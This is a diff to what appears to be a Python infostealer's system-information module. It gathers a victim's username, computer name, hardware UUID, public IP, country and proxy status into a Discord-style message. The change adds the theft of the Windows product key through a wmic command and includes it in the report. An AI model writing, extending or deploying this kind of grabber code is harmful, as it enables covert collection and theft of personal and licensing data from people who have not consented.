@@ -33,7 +33,9 @@ class PcInfo:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
         uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
-        
+        product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+
+
         try:
             r: dict = requests.get("http://ip-api.com/json/?fields=225545").json()
             if r["status"] != "success":
@@ -59,7 +61,8 @@ class PcInfo:
                              "name": "System Info",
                              "value": f''':computer: **PC Username:** `{username}`
 :desktop: **PC Name:** `{hostname}`
-:globe_with_meridians: **OS:** `{computer_os}`\n
+:globe_with_meridians: **OS:** `{computer_os}`
+<:windows:1239719032849174568> **Product Key:** `{product_key}`\n
 :eyes: **IP:** `{ip}`
 :flag_{self.get_country_code(country)}: **Country:** `{country}`
 {":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`
